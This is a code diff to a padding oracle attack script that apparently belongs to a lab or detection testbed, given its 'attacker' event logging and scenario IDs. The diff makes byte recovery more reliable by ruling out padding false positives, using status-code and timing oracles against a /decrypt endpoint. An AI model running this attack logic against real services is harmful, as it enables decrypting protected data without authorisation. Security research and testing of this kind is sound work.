@@ -195,6 +195,20 @@ def padding_oracle_attack_block(
             )
 
             if valid_padding:
+                # Disambiguate for pad_len == 1: verify it's not a multi-byte padding fluke (e.g. 0x02 0x02)
+                if pad_len == 1 and idx > 0:
+                    check_iv = bytearray(attack_iv)
+                    check_iv[idx - 1] ^= 1
+                    check_crafted = bytes(check_iv) + c_target
+                    if oracle_mode == "vuln":
+                        check_status, _ = decrypt_oracle_status(base_url, check_crafted)
+                        if check_status not in (200, 403):
+                            continue
+                    else:
+                        is_fast, _, _ = decrypt_oracle_timing(base_url, check_crafted)
+                        if not is_fast:
+                            continue
+
                 intermediate[idx] = guess ^ pad_len
                 recovered[idx] = intermediate[idx] ^ c_prev[idx]
                 rec_byte = int(recovered[idx])
@@ -317,6 +331,21 @@ def main() -> int:
         return 0
     except Exception as e:
         elapsed = time.perf_counter() - started
+        emit_event(
+            "attacker",
+            {
+                "event_type": "attack_error",
+                "scenario_id": args.scenario_id,
+                "src_ip": get_attack_ip(),
+                "endpoint": "/decrypt",
+                "status_code": 500,
+                "latency_ms": round(elapsed * 1000, 3),
+                "error_type": "attack_failed",
+                "details": {
+                    "error": str(e),
+                },
+            },
+        )
         print(f"[X] Attacco fallito / interrotto: {e} in {elapsed:.2f}s")
         return 1
 
